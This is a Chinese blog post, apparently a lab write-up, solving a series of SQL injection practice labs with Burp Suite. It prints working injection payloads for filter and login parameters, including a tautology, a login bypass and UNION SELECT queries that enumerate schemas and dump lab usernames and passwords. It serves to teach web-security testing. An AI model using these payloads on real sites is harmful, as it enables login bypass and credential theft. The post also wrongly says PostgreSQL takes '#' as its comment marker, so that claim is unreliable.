---
title: BurpSuite_Lab
date: 2025-03-11 23:04:30
tags:
    - Burp Suite
    - CTF
    - Cybersecurity
---
## SQL Injection
该实验名称是SQL injection vulnerability in WHERE clause allowing retrieval of hidden data，打开Burp Suite，在浏览器中访问靶机地址，分析Burp Suite监听得到的数据包。
我们注意到他的filter使用的是直接嵌入网址中发起一个查询操作，在Burp Suite中的数据包产生如下，可以发现filter功能是直接使用Get获得相关数据，可以测试看看是否存在SQL Injection。
```HTTP
GET /filter?category=Gifts HTTP/2
```
使用下面的payload进行第一次测试，结果发现返回500错误，因此可以发现，该数值改变对服务器返回值产生直接影响，因此存在SQL注入漏洞。
```HTTP
GET /filter?category=Gifts'
```
那么可以考虑简单的万能payload，这个payload直接返回了所有的商品目录，事实上，做到这里这个简单的靶机实验便完成了，我们也可以看到SQL注入的威力。
```HTTP
GET /filter?category=Gifts'+or+1=1--
```

## User Bypass
该实验为sqli第二个实验。
尝试在username中直接输入`'`，发现存在注入问题。
简单来说就是一个登陆绕过，核心原因是server采取直接将用户输入值放入sql语句中进行查询造成了sql注入，绕过了登陆验证，直接访问了目标用户。
```HTTP
/login?username=administrator'--&password=abcdef
```

## UNION SELECT
与sqli-1类似，也是使用filter，且该filter变化能够导致服务器也产生相应的影响。
```HTTP
GET /filter?category=Gifts
```
如果直接加`'`可以导致服务器500错误，发现可能存在注入点。
尝试如下payload，依次验证合适的注入点。
```
GET /filter?category=Gifts' OR 1=1;--
GET /filter?category=Gifts' OR 1=1--
```
由于数据的结果呈现数据表的形式，因而返回值有可能是含多个值的组合，因此使用UNION SELECT NULL来验证存在多少个column值。
验证发现，但NULL数量为3时可以顺利返回值，故发现该sql查询返回column为3
此处使用NULL的原因是我们并不知道select的column值的类型，因此使用NULL，便可以正确执行。

## UNION SELECT 2
在上个靶机的基础上，使用单个逐次修改NULL为某一类型的值，例如1，'1'，来试验该位置的返回值类型，如果类型相同会返回200，类型不同返回500 Error。
```
/filter?category=' OR 1=1 UNION SELECT 1,NULL,NULL--
/filter?category=' OR 1=1 UNION SELECT NULL,1,NULL--
/filter?category=' OR 1=1 UNION SELECT NULL,NULL,1--


/filter?category=' OR 1=1 UNION SELECT 'a',NULL,NULL--
/filter?category=' OR 1=1 UNION SELECT NULL,'a',NULL--
/filter?category=' OR 1=1 UNION SELECT NULL,NULL,'a'--
```
经过多次操作，如此便可以确定返回值类型，以满足题目要求。

## UNION SELECT 3
首先先用UNION SELECT测试其中有几个参数，不过根据网页的显示，能够猜测应该是两个值，而且应该都是string，一个是标题，一个是文本。
```
/filter?category=Pets' UNION SELECT NULL, NULL--
/filter?category=Pets' UNION SELECT 'a', 'b'--
```
接着我们就可以在这个基础上，继续进行注入测试。
information_schema.schemata是SQL中常见的默认表格，通过payload，我们可以发现，其中有三个重要的表格information_scheama, public, pg_catalog。
```
/filter?category=Pets' UNION SELECT 'a',schema_name from information_schema.schemata--
```
information_schema.tables包含了SQL中所有的tables，搜索可以发现其中有一个叫users的table，不难猜测，这个table大概率就是我们需要的table。
```
/filter?category=Pets' UNION SELECT 'a', table_name from information_schema.tables--
```
information_schema.columns包含了SQL中所有table的column，我们可以通过这个查询到某个表格的column名，经过查询不难发现users表格中存在三个列，username、email和password。
```
/filter?category=Pets' UNION SELECT 'a', column_name from information_schema.columns where TABLE_NAME='users'--
```
如此我们可以尝试将username和password查询一下，返回了三个user，可以尝试登录了，我还顺便查询了email的值，发现其实没有一个user的email存在。
```
/filter?category=Pets' UNION SELECT username, password from users--
wiene h20zlyz8adkisyyt5vjl
administrator 98p19olmcgbbrnbvs8ky
carlos hk1qz43lhberfddscdyu
```
有意思的是虽然存在三个user，但wiene是登陆不了的。
Lab到这里也便完成了。

## Union Select 4
与上题前面流程非常类似，不过这题的两个变量，一个是number，一个是string，事实上我们只需要使用string即可，而number可以忽略。
按照类似的方法，我们最终可以得到users表格中存在username、email和password列，我们需要的是username和password，但我们只有一个string，可以考虑字符串拼接。
根据如下payload我们便能顺利解出这道题了。
```
Gifts' union select 1,username || '~' || password from users--

carlos~7ausrn2nfdbbr86d1b46
wiener~r0tzsd0a9ozg07nosu6h
administrator~bid7qv0usls2gbtoyt1c
```

## DataBase 1
本题与前面的题目也是类似的，只是本题无法接受`--`作为注释符号，只接受`#`作为注释符号，而很明显一般来说只有PostgreSQL才使用`#`作为注释符号，那么题目便坚决了。
```
Gifts' UNION SELECT 'a', version()#
```

## DataBase 2
